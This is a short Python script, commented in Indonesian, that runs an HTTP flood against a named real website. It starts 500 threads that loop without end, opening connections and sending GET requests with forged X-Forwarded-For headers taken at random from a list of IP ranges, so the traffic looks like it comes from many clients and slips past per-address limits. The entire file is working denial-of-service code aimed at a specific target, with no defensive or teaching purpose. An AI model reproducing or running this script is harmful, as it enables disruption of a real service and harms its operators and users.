import socket
import threading
import ipaddress
import random

# Resolve domain to IP
target_host = 'alfalearning.sat.co.id'
target_ip = socket.gethostbyname(target_host)
target_port = 80  # Port untuk HTTP

# List CIDR
cidr_list = [
    '172.104.33.0/24',
    '172.104.34.0/24',
    '172.104.35.0/24',
    '172.104.36.0/24',
    '172.104.39.0/24',
    '172.104.40.0/24',
    '172.104.41.0/24',
    '172.104.42.0/24',
    '172.104.43.0/24',
    '172.104.44.0/24',
    '172.104.45.0/24',
    '172.104.46.0/24',
    '172.104.47.0/24',
    '172.104.48.0/24',
    '172.104.49.0/24',
    '172.104.50.0/24',
    '172.104.51.0/24',
    '172.104.52.0/24',
    '172.104.53.0/24',
    '172.104.54.0/24',
    '172.104.55.0/24',
    '172.104.56.0/24',
    '172.104.57.0/24',
    '172.104.58.0/24',
    '172.104.59.0/24',
    '172.104.60.0/24',
    '172.104.61.0/24',
    '172.104.62.0/24',
    '172.104.63.0/24'
]

# Fungsi untuk menghasilkan IP acak dari list CIDR
def get_random_ip():
    cidr = random.choice(cidr_list)
    ip_network = ipaddress.IPv4Network(cidr)
    return str(random.choice(list(ip_network.hosts())))

def attack():
    while True:
        fake_ip = get_random_ip()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
        s.sendto(("Host: " + target_host + "\r\n").encode('ascii'), (target_ip, target_port))
        s.sendto(("X-Forwarded-For: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
        s.close()

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
